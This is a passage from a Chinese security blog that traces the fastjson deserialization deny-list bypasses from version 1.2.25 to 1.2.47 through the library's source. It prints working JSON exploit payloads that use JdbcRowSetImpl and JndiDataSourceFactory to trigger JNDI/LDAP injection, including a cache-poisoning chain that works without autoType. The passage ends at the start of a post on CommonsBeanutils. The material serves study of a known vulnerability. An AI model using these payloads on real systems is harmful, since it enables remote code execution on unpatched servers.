class="headerlink" title="修复"></a>修复</h3><p>在这个版本中，fastjson增加了黑名单而且设置了一个<code>autoTypeSupport</code>用来控制是否可以反序列化，<code>autoTypeSupport</code>默认为<code>false</code>且禁止反序列化，为true时会使用<code>checkAutoType</code>来进行安全检测</p><p>是在DefaultJSONParser.parseObject()里用的</p><p>1.2.24版本：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524143022145.png" alt="image-20230524143022145"></p><p>1.2.25版本：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524143208177.png" alt="image-20230524143208177"></p><p>跟进这个checkAutoType看看</p><pre class="language-java" data-language="java"><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;    if (typeName &#x3D;&#x3D; null) &#123;        return null;    &#125;     final String className &#x3D; typeName.replace(&#39;$&#39;, &#39;.&#39;);     &#x2F;&#x2F; autoTypeSupport默认为False    &#x2F;&#x2F; 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤    if (autoTypeSupport || expectClass !&#x3D; null) &#123;        for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123;            String accept &#x3D; acceptList[i];            if (className.startsWith(accept)) &#123;                return TypeUtils.loadClass(typeName, defaultClassLoader);            &#125;        &#125;         for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123;            String deny &#x3D; denyList[i];            if (className.startsWith(deny)) &#123;                throw new JSONException(&quot;autoType is not support. &quot; + typeName);            &#125;        &#125;    &#125;     &#x2F;&#x2F; 从Map缓存中获取类，注意这是后面版本的漏洞点    Class&lt;?&gt; clazz &#x3D; TypeUtils.getClassFromMapping(typeName);    if (clazz &#x3D;&#x3D; null) &#123;        clazz &#x3D; deserializers.findClass(typeName);    &#125;     if (clazz !&#x3D; null) &#123;        if (expectClass !&#x3D; null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());        &#125;         return clazz;    &#125;     &#x2F;&#x2F; 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错    if (!autoTypeSupport) &#123;        for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123;            String deny &#x3D; denyList[i];            if (className.startsWith(deny)) &#123;                throw new JSONException(&quot;autoType is not support. &quot; + typeName);            &#125;        &#125;        for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123;            String accept &#x3D; acceptList[i];            if (className.startsWith(accept)) &#123;                clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader);                 if (expectClass !&#x3D; null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                &#125;                return clazz;            &#125;        &#125;    &#125;     if (autoTypeSupport || expectClass !&#x3D; null) &#123;        clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader);    &#125;     if (clazz !&#x3D; null) &#123;         if (ClassLoader.class.isAssignableFrom(clazz) &#x2F;&#x2F; classloader is danger            || DataSource.class.isAssignableFrom(clazz) &#x2F;&#x2F; dataSource can load jdbc driver           ) &#123;            throw new JSONException(&quot;autoType is not support. &quot; + typeName);        &#125;         if (expectClass !&#x3D; null) &#123;            if (expectClass.isAssignableFrom(clazz)) &#123;                return clazz;            &#125; else &#123;                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());            &#125;        &#125;    &#125;     if (!autoTypeSupport) &#123;        throw new JSONException(&quot;autoType is not support. &quot; + typeName);    &#125;     return clazz;&#125;</code></pre><p>简单地说，<code>checkAutoType()</code>函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;denyListbshcom.mchangecom.sun.java.lang.Threadjava.net.Socketjava.rmijavax.xmlorg.apache.bcelorg.apache.commons.beanutilsorg.apache.commons.collections.Transformerorg.apache.commons.collections.functorsorg.apache.commons.collections4.comparatorsorg.apache.commons.fileuploadorg.apache.myfaces.context.servletorg.apache.tomcatorg.apache.wicket.utilorg.codehaus.groovy.runtimeorg.hibernateorg.jbossorg.mozilla.javascriptorg.python.coreorg.springframework</code></pre><p>这里因为黑名单中包含了”com.sun.”，所以就把我们前面的几个利用链都给过滤了</p><p>先在如果还是用之前的payload会报错</p><p><code>autoType is not support. com.sun.rowset.JdbcRowSetImpl</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524144135776.png" alt="image-20230524144135776"></p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过的前提是autoTypeSupport开启，在这种情况下</p><p>调用checkAutoType后，会先进行这个if判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524145217675.png" alt="image-20230524145217675"></p><p>也就是先找白名单，找到直接加载，找不到就去找黑名单，找到直接报错。</p><p>假设都没找到，在后面也还是会加载类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524145300385.png" alt="image-20230524145300385"></p><p>所以只要想办法绕过第一个if里的对黑名单的检测就可以了</p><p>跟一下后面这个loadClass</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524145340344.png" alt="image-20230524145340344"></p><p>会发现它在加载之前会对传进去的特定内容进行一个切割，对切割后的内容进行类加载</p><p>所以我们让com.sun.rowset.JdbcRowSetImpl以L开头，以；结尾</p><p>变为Lcom.sun.rowset.JdbcRowSetImpl;</p><p>这样既能绕过黑名单，又能实现类加载</p><p>poc为</p><pre class="language-java" data-language="java"><code class="language-java">public class text &#123;    public static void main(String[] args) &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  &#x2F;&#x2F;开启autoTypeSupport        String poc &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F;a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;        JSON.parse(poc);    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524145610564.png" alt="image-20230524145610564"></p><h2 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h2><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>在这个版本中，依旧用了黑白名单的方式，但是用hash的方式存的黑名单。应该是为了防止其他人根据这个去找绕过的路径</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524181433397.png" alt="image-20230524181433397"></p><p>然后再checkAutoType方法里加了个这种东西。如果这个类名是以L开头和以;结尾的，就去掉第一个字符和最后一个字符再进行后面的判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524181855173.png" alt="image-20230524181855173"></p><p><del>吐槽一下，这个if判断至于也要写成hash的形式吗，这截取的substring这么明显，而且截取的方式是不是有点太草率了</del></p><h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>双写</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524183124401.png" alt="image-20230524183124401"></p><pre class="language-java" data-language="java"><code class="language-java">public class text &#123;    public static void main(String[] args) &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  &#x2F;&#x2F;开启autoTypeSupport        String poc &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F;a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;        JSON.parse(poc);    &#125;&#125;</code></pre><h2 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h2><h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>在checkAutoType里对传入的东西再加了一层判断，如果前两位是LL，那就直接报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524205412360.png" alt="image-20230524205412360"></p><h3 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h3><p>在loadClass里除了对L开头；结尾的输入进行处理，还对[开头的输入也进行了截取，所以</p><p>[com.sun.rowset.JdbcRowSetImpl，通过这个方式可以过checkAutotype检测</p><p>但是这样会有个报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524210618496.png" alt="image-20230524210618496"></p><p>这里就需要你在类路径后边加上[{，至于为什么还没怎么跟，原因就是</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524210730026.png" alt="image-20230524210730026"></p><p>具体源码没跟，以后有空再说</p><h2 id="1-2-44"><a href="#1-2-44" class="headerlink" title="1.2.44"></a>1.2.44</h2><h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>在<code>checkAutoType</code>中进行判断如果类名以<code>[</code>开始则直接抛出异常，由字符串处理导致的黑名单绕过也就告一段落了。</p><h3 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h3><p>这个版本没绕过，倒不是因为这个版本就没洞了，只不过是因为在之后版本发现的payload在这个版本也能用</p><h2 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1.2.45"></a>1.2.45</h2><h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>也不能叫修复吧，毕竟上个版本也没爆漏洞</p><p>增加了黑名单</p><h3 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h3><p>这里安全研究者将目光投向了组件身上</p><p>1.2.45的payload就是由mybatis导致的组件漏洞</p><p>先贴一个payload</p><pre class="language-java" data-language="java"><code class="language-java">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;&#125;&#125;</code></pre><p>由于org.apache.ibatis.datasource.jndi.JndiDataSourceFactory不在黑名单，所以能绕过checkAutoType的判断</p><p>然后按照Fastjson的特性，会去调用属性的set方法赋值</p><p>这个payload里有properties方法，理所当然的会去调用setProperties</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524212504342.png" alt="image-20230524212504342"></p><p>又因为我们给properties赋的值的键是data_source</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524212618440.png" alt="image-20230524212618440"></p><p>满足这个else if判断</p><p>这是里调用了lookup方法，而里边的getProperty方法就是获取data_source这个键对应的值</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524212743667.png" alt="image-20230524212743667"></p><p>现在我们有了一个lookup方法，还有了个可控的url</p><p>就能实现jndi注入了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524212900228.png" alt="image-20230524212900228"></p><h2 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h2><h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p>没怎么找资料，大概也就是把org.apache.ibatis.datasource.jndi.JndiDataSourceFactory类也放黑名单里了之类的，这个版本重点在绕过</p><h3 id="绕过-5"><a href="#绕过-5" class="headerlink" title="绕过"></a>绕过</h3><p>自1.2.24漏洞修复后，我们的绕过都需要依赖<strong>AutoTypeSupport</strong>为true才能实现，这其实大大限制了我们的利用，而1.2.47版本出现的利用方式则解决了这一问题</p><p>这里出问题的还是负责安全检查的checkAutoType方法</p><pre class="language-java" data-language="java"><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;       &#x2F;&#x2F; 类名非空判断       if (typeName &#x3D;&#x3D; null) &#123;           return null;       &#125;       &#x2F;&#x2F; 类名长度判断，不大于128不小于3       if (typeName.length() &gt;&#x3D; 128 || typeName.length() &lt; 3) &#123;           throw new JSONException(&quot;autoType is not support. &quot; + typeName);       &#125;       String className &#x3D; typeName.replace(&#39;$&#39;, &#39;.&#39;);       Class&lt;?&gt; clazz &#x3D; null;       final long BASIC &#x3D; 0xcbf29ce484222325L; &#x2F;&#x2F;;       final long PRIME &#x3D; 0x100000001b3L;  &#x2F;&#x2F;L       final long h1 &#x3D; (BASIC ^ className.charAt(0)) * PRIME;       &#x2F;&#x2F; 类名以 [ 开头抛出异常       if (h1 &#x3D;&#x3D; 0xaf64164c86024f1aL) &#123; &#x2F;&#x2F; [           throw new JSONException(&quot;autoType is not support. &quot; + typeName);       &#125;       &#x2F;&#x2F; 类名以 L 开头以 ; 结尾抛出异常       if ((h1 ^ className.charAt(className.length() - 1)) * PRIME &#x3D;&#x3D; 0x9198507b5af98f0L) &#123;           throw new JSONException(&quot;autoType is not support. &quot; + typeName);       &#125;       final long h3 &#x3D; (((((BASIC ^ className.charAt(0))               * PRIME)               ^ className.charAt(1))               * PRIME)               ^ className.charAt(2))               * PRIME;       &#x2F;&#x2F; autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项       if (autoTypeSupport || expectClass !&#x3D; null) &#123;           long hash &#x3D; h3;           for (int i &#x3D; 3; i &lt; className.length(); ++i) &#123;               hash ^&#x3D; className.charAt(i);               hash *&#x3D; PRIME;               if (Arrays.binarySearch(acceptHashCodes, hash) &gt;&#x3D; 0) &#123;                   clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader, false);                   if (clazz !&#x3D; null) &#123;                       return clazz;                   &#125;               &#125;               &#x2F;&#x2F; 再对比 denyHashCodes 进行黑名单匹配               &#x2F;&#x2F; 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类               &#x2F;&#x2F; 则抛出异常               if (Arrays.binarySearch(denyHashCodes, hash) &gt;&#x3D; 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) &#x3D;&#x3D; null) &#123;                   throw new JSONException(&quot;autoType is not support. &quot; + typeName);               &#125;           &#125;       &#125;       &#x2F;&#x2F; 尝试在 TypeUtils.mappings 中查找缓存的 class       if (clazz &#x3D;&#x3D; null) &#123;           clazz &#x3D; TypeUtils.getClassFromMapping(typeName);       &#125;       &#x2F;&#x2F; 尝试在 deserializers 中查找这个类       if (clazz &#x3D;&#x3D; null) &#123;           clazz &#x3D; deserializers.findClass(typeName);       &#125;       &#x2F;&#x2F; 如果找到了对应的 class，则会进行 return       if (clazz !&#x3D; null) &#123;           if (expectClass !&#x3D; null                   &amp;&amp; clazz !&#x3D; java.util.HashMap.class                   &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;               throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());           &#125;           return clazz;       &#125;       &#x2F;&#x2F; 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致       if (!autoTypeSupport) &#123;           long hash &#x3D; h3;           for (int i &#x3D; 3; i &lt; className.length(); ++i) &#123;               char c &#x3D; className.charAt(i);               hash ^&#x3D; c;               hash *&#x3D; PRIME;               if (Arrays.binarySearch(denyHashCodes, hash) &gt;&#x3D; 0) &#123;                   throw new JSONException(&quot;autoType is not support. &quot; + typeName);               &#125;               if (Arrays.binarySearch(acceptHashCodes, hash) &gt;&#x3D; 0) &#123;                   if (clazz &#x3D;&#x3D; null) &#123;                       clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader, false);                   &#125;                   if (expectClass !&#x3D; null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;                       throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                   &#125;                   return clazz;               &#125;           &#125;       &#125;       &#x2F;&#x2F; 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类       if (clazz &#x3D;&#x3D; null) &#123;           clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader, false);       &#125;       if (clazz !&#x3D; null) &#123;           if (TypeUtils.getAnnotation(clazz,JSONType.class) !&#x3D; null) &#123;               return clazz;           &#125;           if (ClassLoader.class.isAssignableFrom(clazz) &#x2F;&#x2F; classloader is danger                   || DataSource.class.isAssignableFrom(clazz) &#x2F;&#x2F; dataSource can load jdbc driver                   ) &#123;               throw new JSONException(&quot;autoType is not support. &quot; + typeName);           &#125;           if (expectClass !&#x3D; null) &#123;               if (expectClass.isAssignableFrom(clazz)) &#123;                   return clazz;               &#125; else &#123;                   throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());               &#125;           &#125;           JavaBeanInfo beanInfo &#x3D; JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);           if (beanInfo.creatorConstructor !&#x3D; null &amp;&amp; autoTypeSupport) &#123;               throw new JSONException(&quot;autoType is not support. &quot; + typeName);           &#125;       &#125;       final int mask &#x3D; Feature.SupportAutoType.mask;       boolean autoTypeSupport &#x3D; this.autoTypeSupport               || (features &amp; mask) !&#x3D; 0               || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) !&#x3D; 0;       if (!autoTypeSupport) &#123;           throw new JSONException(&quot;autoType is not support. &quot; + typeName);       &#125;       return clazz;   &#125;</code></pre><p>这里其实有个问题</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524214001583.png" alt="image-20230524214001583"></p><p>这块，如果开启了autoTypeSupport，fastjson还是会限制黑名单类的反序列化，但是前提是TypeUtils.mappings里没有缓存这个类，那假如缓存了，即使身处黑名单中的类，也可以继续被程序反序列化</p><p>而在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以必须想办法在当autoTypeSupport为false时执行的这个if判断前实现我们的攻击目的，或者退出checkAutoType方法</p><p>在这个if判断之前就这点代码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524214858725.png" alt="image-20230524214858725"></p><p>由于clazz初值是null，前面也没地方赋值，所以其实在这个if之前就俩if判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524215007194.png" alt="image-20230524215007194"></p><p>假如在这里面能实现攻击那自然不用再管后面的程序，而如果能在这里面把clazz的值给赋上，那就能在判断autoTypeSupport是否为假的if判断前退出程序</p><p>先看 deserializers ，位于 <code>com.alibaba.fastjson.parser.ParserConfig.deserializers</code> ，是一个 IdentityHashMap，能向其中赋值的函数有：</p><ul><li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li><li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li><li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</li></ul><p>因此我们无法向 deserializers 中写入值，也就在其中读出我们想要的恶意类。所以我们的目光转向了 <code>TypeUtils.getClassFromMapping(typeName)</code>。</p><p>这个方法从 <code>TypeUtils.mappings</code> 中取值，这是一个 ConcurrentHashMap 对象，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524222728948.png" alt="image-20230524222728948"></p><p>能向其中赋值的函数有：</p><ul><li><code>addBaseClassMappings()</code>：无入参，加载</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524222801525.png" alt="image-20230524222801525"></p><p><code>loadClass()</code>：关键函数</p><pre class="language-java" data-language="java"><code class="language-java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;        &#x2F;&#x2F; 非空判断        if(className &#x3D;&#x3D; null || className.length() &#x3D;&#x3D; 0)&#123;            return null;        &#125;        &#x2F;&#x2F; 防止重复添加        Class&lt;?&gt; clazz &#x3D; mappings.get(className);        if(clazz !&#x3D; null)&#123;            return clazz;        &#125;        &#x2F;&#x2F; 判断 className 是否以 [ 开头        if(className.charAt(0) &#x3D;&#x3D; &#39;[&#39;)&#123;            Class&lt;?&gt; componentType &#x3D; loadClass(className.substring(1), classLoader);            return Array.newInstance(componentType, 0).getClass();        &#125;        &#x2F;&#x2F; 判断 className 是否 L 开头 ; 结尾        if(className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;))&#123;            String newClassName &#x3D; className.substring(1, className.length() - 1);            return loadClass(newClassName, classLoader);        &#125;        try&#123;            &#x2F;&#x2F; 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中            if(classLoader !&#x3D; null)&#123;                clazz &#x3D; classLoader.loadClass(className);                if (cache) &#123;                    mappings.put(className, clazz);                &#125;                return clazz;            &#125;        &#125; catch(Throwable e)&#123;            e.printStackTrace();            &#x2F;&#x2F; skip        &#125;        &#x2F;&#x2F; 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中        try&#123;            ClassLoader contextClassLoader &#x3D; Thread.currentThread().getContextClassLoader();            if(contextClassLoader !&#x3D; null &amp;&amp; contextClassLoader !&#x3D; classLoader)&#123;                clazz &#x3D; contextClassLoader.loadClass(className);                if (cache) &#123;                    mappings.put(className, clazz);                &#125;                return clazz;            &#125;        &#125; catch(Throwable e)&#123;            &#x2F;&#x2F; skip        &#125;        &#x2F;&#x2F; 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中        try&#123;            clazz &#x3D; Class.forName(className);            mappings.put(className, clazz);            return clazz;        &#125; catch(Throwable e)&#123;            &#x2F;&#x2F; skip        &#125;        return clazz;    &#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524223019994.png" alt="image-20230524223019994"></p><p>所以可以通过控制传参实现在mapping里放入任意的类</p><p>这个loadClass有三个重载</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524223745658.png" alt="image-20230524223745658"></p><p>我们的目标就是调用第三个，而从一或者从二都能到第三个。</p><p>因为第三个只在checkAutoType里和第二个loadClass里调用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524223939519.png" alt="image-20230524223939519"></p><p>所以这个没戏了</p><p>然后这里重点看一下两个参数的loadClass</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524224045140.png" alt="image-20230524224045140"></p><p>进deserialze里看一眼</p><p>这个类是用来处理一些乱七八糟类的反序列化类，其中就包括 <code>Class.class</code> 类，可以当我们加载恶意字节码的入口。</p><p>如果这个类是Class.class类型，就调用我们的loadClass</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524224323194.png" alt="image-20230524224323194"></p><p>再看一下loadClass的参数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524225226576.png" alt="image-20230524225226576"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524225236990.png" alt="image-20230524225236990"></p><p>是可控的。只需要parser.resolveStatus 的值为TypeNameRedirect而且加载的是个Class.class类型的，就可以进入loadClass里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524231749730.png" alt="image-20230524231749730"></p><p>在loadClass里，他会把我们传入的类加进缓存里，所以如果我们的恶意payload有两部分，第一部分负责将恶意类假如缓存，第二部分就可以绕过黑名单的检查去执行命令</p><p>加入缓存的地方找到了，接下来简单说一下调用的过程和构造payload的时候的参数问题</p><p>调用MiscCodec#deserialze的地方在DefaultJSONParser#parseObject。在安全检查的后边，但是因为我们第一部分的payload肯定不会触发安全检查的报错，也就是说MiscCodec#deserialze一定会被触发</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524232603778.png" alt="image-20230524232603778"></p><p>这个clazz就是@type的值，然后由于MiscCodec#deserialze里有</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524233059139.png" alt="image-20230524233059139"></p><p>所以想要进缓存的类的键必须为val</p><p>我们可以编写</p><p>第一部分的payload了</p><p><code>&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</code></p><p>后边就没啥说的了，因为绕过了安全检查，所以第二部分用之前JdbcRowSetImpl链的payload就行</p><p>完整payload</p><pre class="language-java" data-language="java"><code class="language-java">String poc &#x3D; &quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F;a\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230524233602557.png" alt="image-20230524233602557"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这篇其实写的挺赶的，主要是先为了学会利用，所以没怎么细跟代码，而且有点错误在里边，比如1.2.47的payload的不受AutoTypeSupport影响的版本：其实是<code>1.2.25 &lt;= fastjson &lt;= 1.2.32</code>而受AutoTypeSupport影响版本有<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code></p><p>具体原因还没看</p><p>还有就是关于高jdk版本绕过以及fastjson-1.2.68和fastjson结合原生反序列化利用的漏洞利用没写，等打完国赛或者过完期末再补吧</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://su18.org/post/fastjson/">https://su18.org/post/fastjson/</a></p><p><a href="https://tttang.com/archive/1579/">https://tttang.com/archive/1579/</a></p><p><a href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.999.0.0&vd_source=053f03b424a45370bc5813843ae5268f">fastjson反序列化漏洞3-&lt;=1.2.47绕过_哔哩哔哩_bilibili</a></p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">FastJson与原生反序列化 | Y4tacker&#39;s Blog</a></p><p><a href="https://goodapple.top/archives/832">https://goodapple.top/archives/832</a></p><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E3-%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/">Fastjson反序列化漏洞(3)—历史版本绕过 – JohnFrod&#39;s Blog</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsBeanutils反序列化</title>
      <link href="/2023/04/27/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/04/27/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>本来是在学shiro 的，发现shiro无依赖反序列化需要用CB链，所以就先学一下CB链</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>commons-beanutils 是 Apache 提供的一个用于操作 JAVA bean 的工具包。里面提供了各种各样的工具类，让我们可以很方便的对 bean 对象的属性进行各种操作。</p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>     artifactId>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h2 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h2><p><code>org.apache.commons.beanutils.PropertyUtils</code> 类使用 Java 反射 API 来调用 Java 对象上的通用属性 getter 和 setter 操作的实用方法。这些方法的具体使用逻辑其实是由 <code>org.apache.commons.beanutils.PropertyUtilsBean</code> 来实现的。</p><p>这个类有个共有静态方法 